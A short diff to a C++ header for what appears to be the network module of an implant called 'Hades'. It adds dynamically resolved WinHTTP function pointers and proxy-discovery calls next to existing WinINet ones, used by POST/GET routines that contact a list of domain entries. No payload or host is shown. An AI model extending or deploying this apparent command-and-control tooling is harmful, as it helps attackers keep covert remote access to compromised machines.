@@ -1,12 +1,33 @@
 #pragma once
 #include <Windows.h>
+#include <winhttp.h>
 #include <wininet.h>
-#include "../shared/common.hpp"
+#include "../hades/hades.h"
 #include "../hades/config.hpp"
 
 #define DECL(x) decltype(x) * x;
 
+
+
+
 struct HTTPAPIS {
+	DECL(WinHttpOpen);
+	DECL(WinHttpConnect);
+	DECL(WinHttpCloseHandle);
+	DECL(WinHttpOpenRequest);
+	DECL(WinHttpSendRequest);
+	DECL(WinHttpReceiveResponse);
+	DECL(WinHttpQueryDataAvailable);
+	DECL(WinHttpQueryHeaders);
+	DECL(WinHttpReadData);
+	DECL(WinHttpSetOption);
+	DECL(WinHttpAddRequestHeaders);
+	DECL(WinHttpGetIEProxyConfigForCurrentUser);
+	DECL(WinHttpGetProxyForUrl);
+	DECL(WinHttpDetectAutoProxyConfigUrl);
+	DECL(WinHttpGetDefaultProxyConfiguration);
+
+
 	DECL(InternetOpenA);
 	DECL(InternetConnectA);
 	DECL(HttpOpenRequestA);
@@ -27,6 +48,7 @@ class Network {
 	HTTPAPIS* HttpApis;
 	DWORD reqFlags;
 	ULONG HadesID;
+	HANDLE Heap;
 
 	BOOL DoPostSingle(PBYTE toSend, SIZE_T len, DomainEntry* domain);
 	BOOL DoGetSingle(PBYTE* ResponseBuf, SIZE_T size, DomainEntry* domain, ULONG id, UINT* FinalSize, UINT* capacity);
